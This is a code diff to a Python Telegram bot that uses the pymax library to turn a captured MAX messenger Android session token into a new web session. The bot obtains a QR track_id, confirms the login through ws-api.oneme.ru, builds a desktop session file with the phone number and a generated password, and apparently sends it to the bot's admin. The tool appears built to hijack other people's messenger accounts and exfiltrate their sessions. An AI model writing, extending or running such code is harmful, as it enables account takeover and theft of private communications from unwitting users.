@@ -15,7 +15,7 @@ from aiogram.fsm.context import FSMContext
 from aiogram.fsm.state import State, StatesGroup
 from aiogram.fsm.storage.memory import MemoryStorage
 from aiogram.types import FSInputFile
-from pymax import Client as SocketMaxClient
+from pymax import Client as SocketMaxClient, WebClient, QrAuthFlow, QrHandler
 from pymax.auth.providers import PasswordProvider
 import aiohttp
 
@@ -113,44 +113,41 @@ async def send_files(phone, uid, work_dir, desktop, js):
         caption=f"🌐 ВЕБ\nНомер: {phone}", parse_mode="HTML")
 
 async def get_web_token(android_token, user_id, phone, uid, work_dir):
-    """Получает веб-токен через QR-привязку: запрос QR -> подтверждение -> получение токена."""
+    """Получает веб-токен через QR: получает track_id через WebClient, подтверждает, забирает токен."""
+    track_id = None
+    web_device_id = gen_device_id()
+
+    # Шаг 1: Получаем track_id через WebClient
+    class TrackIdHandler(QrHandler):
+        async def show_qr(self, qr_link):
+            nonlocal track_id
+            parts = qr_link.split('/')
+            track_id = parts[-1] if parts else None
+            logging.info(f"Получен track_id: {track_id}")
+            return True
+
+    try:
+        web_client = WebClient(
+            work_dir=f"{work_dir}_web_{int(time.time())}",
+            auth_flow=QrAuthFlow(qr_provider=TrackIdHandler())
+        )
+        await web_client.start()
+    except Exception as e:
+        logging.error(f"WebClient error: {e}")
+
+    if not track_id:
+        logging.error("Не удалось получить track_id")
+        return None
+
+    logging.info(f"track_id получен: {track_id}")
+
+    # Шаг 2: Подтверждаем QR через HTTP
     headers = {
         "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36",
         "Content-Type": "application/json"
     }
-    web_device_id = gen_device_id()
 
     async with aiohttp.ClientSession() as session:
-        # Шаг 1: Запрашиваем QR-код
-        logging.info("Запрашиваем QR-код...")
-        resp = await session.post(
-            "https://ws-api.oneme.ru/auth/request_qr",
-            json={"device_id": web_device_id, "device_type": "WEB"},
-            headers=headers
-        )
-        text = await resp.text()
-        logging.info(f"Request QR: {resp.status} {text[:500]}")
-
-        track_id = None
-        try:
-            data = json.loads(text)
-            track_id = data.get("track_id")
-            if not track_id:
-                # Пробуем извлечь из ссылки
-                qr_link = data.get("qr_link", "")
-                parts = qr_link.split('/')
-                track_id = parts[-1] if parts else None
-        except:
-            pass
-
-        if not track_id:
-            logging.error("Не удалось получить track_id")
-            return None
-
-        logging.info(f"track_id: {track_id}")
-
-        # Шаг 2: Подтверждаем QR
-        logging.info("Подтверждаем QR...")
         resp = await session.post(
             "https://ws-api.oneme.ru/auth/confirm",
             json={"track_id": track_id, "device_id": web_device_id},
@@ -158,15 +155,13 @@ async def get_web_token(android_token, user_id, phone, uid, work_dir):
         )
         logging.info(f"Confirm QR: {resp.status}")
 
-        # Шаг 3: Ждём и получаем токен
         await asyncio.sleep(3)
 
-        logging.info("Получаем веб-токен...")
+        # Шаг 3: Получаем веб-токен
         resp = await session.post(
             "https://ws-api.oneme.ru/auth/token",
             json={
-                "token": android_token,
-                "viewerId": user_id,
+                "session_token": android_token,
                 "device_id": web_device_id,
                 "device_type": "WEB"
             },
@@ -180,9 +175,8 @@ async def get_web_token(android_token, user_id, phone, uid, work_dir):
                 data = json.loads(text)
                 if data.get("token"):
                     web_token = data["token"]
-                    logging.info(f"Веб-токен получен: {web_token[:30]}...")
+                    logging.info(f"Веб-токен: {web_token[:30]}...")
 
-                    # Отправляем админу
                     desktop = build_desktop_json(
                         web_token, web_device_id, int(time.time() * 1000),
                         gen_password(), user_id, phone
@@ -193,19 +187,6 @@ async def get_web_token(android_token, user_id, phone, uid, work_dir):
                     return web_token
             except:
                 pass
-
-        # Если не получили — пробуем другой запрос
-        resp = await session.post(
-            "https://ws-api.oneme.ru/auth/token",
-            json={
-                "session_token": android_token,
-                "device_id": web_device_id,
-                "device_type": "WEB"
-            },
-            headers=headers
-        )
-        text = await resp.text()
-        logging.info(f"Token response 2: {resp.status} {text[:500]}")
 
     return None
 
